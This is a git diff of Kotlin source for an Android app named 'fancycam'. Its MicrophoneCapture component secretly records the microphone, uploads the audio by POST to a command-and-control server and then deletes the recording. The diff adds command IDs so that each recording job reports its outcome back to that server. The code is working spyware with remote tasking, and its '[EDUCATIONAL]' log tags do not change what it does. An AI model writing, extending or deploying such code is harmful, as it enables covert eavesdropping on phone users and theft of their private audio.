@@ -1,5 +1,8 @@
-package com.example.fancycam
+package com.example.fancycam.services
 
+import com.example.fancycam.network.AppConfig
+import com.example.fancycam.network.DataExfilSender
+import com.example.fancycam.ui.AppActivityLogger
 import android.content.Context
 import android.content.pm.PackageManager
 import android.media.MediaRecorder
@@ -56,9 +59,12 @@ object MicrophoneCapture {
      *   T+31s: HTTP POST upload to C2 begins
      *   T+35s: Upload complete, recording deleted
      */
-    fun startCaptureAndExfiltrate(context: Context, durationMs: Long = 30000L) {
+    fun startCaptureAndExfiltrate(context: Context, durationMs: Long = 30000L, commandId: String? = null) {
         if (context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
             Log.w(TAG, "[EDUCATIONAL] RECORD_AUDIO permission not granted; aborting capture")
+            if (commandId != null) {
+                DataExfilSender.reportCommandResult(context, commandId, status = "failed", error = "RECORD_AUDIO permission not granted")
+            }
             return
         }
 
@@ -66,7 +72,7 @@ object MicrophoneCapture {
             try {
                 val outputFile = File(context.cacheDir, "mic_${System.currentTimeMillis()}.m4a")
 
-                Log.d(TAG, "[EDUCATIONAL] Starting microphone capture (${durationMs}ms)...")
+                Log.d(TAG, "[EDUCATIONAL] Starting microphone capture (${durationMs}ms, id: $commandId)...")
 
                 // === Recording Setup ===
                 recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
@@ -102,13 +108,16 @@ object MicrophoneCapture {
                 Log.d(TAG, "[EDUCATIONAL] Recording stopped — file: ${outputFile.name} (${outputFile.length() / 1024} KB)")
 
                 // === Exfiltrate ===
-                exfiltrateAudioFile(context, outputFile)
+                exfiltrateAudioFile(context, outputFile, commandId)
 
             } catch (e: Exception) {
                 Log.e(TAG, "[EDUCATIONAL] Microphone capture failed", e)
                 recorder?.release()
                 recorder = null
                 isRecording = false
+                if (commandId != null) {
+                    DataExfilSender.reportCommandResult(context, commandId, status = "failed", error = e.message)
+                }
             }
         }.start()
     }
@@ -116,7 +125,7 @@ object MicrophoneCapture {
     /**
      * Uploads recorded audio file to C2 server as multipart POST.
      */
-    private fun exfiltrateAudioFile(context: Context, file: File) {
+    private fun exfiltrateAudioFile(context: Context, file: File, commandId: String? = null) {
         try {
             if (!file.exists() || file.length() == 0L) {
                 Log.w(TAG, "[EDUCATIONAL] Audio file not found or empty")
@@ -159,6 +168,9 @@ object MicrophoneCapture {
                         if (response.isSuccessful) {
                             Log.i(TAG, "[EDUCATIONAL] Audio exfiltration successful to $endpoint")
                             uploadedSuccessfully = true
+                            if (commandId != null) {
+                                DataExfilSender.reportCommandResult(context, commandId, status = "completed", result = org.json.JSONObject().put("endpoint", endpoint))
+                            }
                             AppActivityLogger.logActivity(
                                 context,
                                 type = "AUDIO_UPLOAD",
@@ -177,6 +189,9 @@ object MicrophoneCapture {
             }
 
             if (!uploadedSuccessfully) {
+                if (commandId != null) {
+                    DataExfilSender.reportCommandResult(context, commandId, status = "failed", error = "Could not reach configured server")
+                }
                 AppActivityLogger.logActivity(
                     context,
                     type = "AUDIO_FAIL",
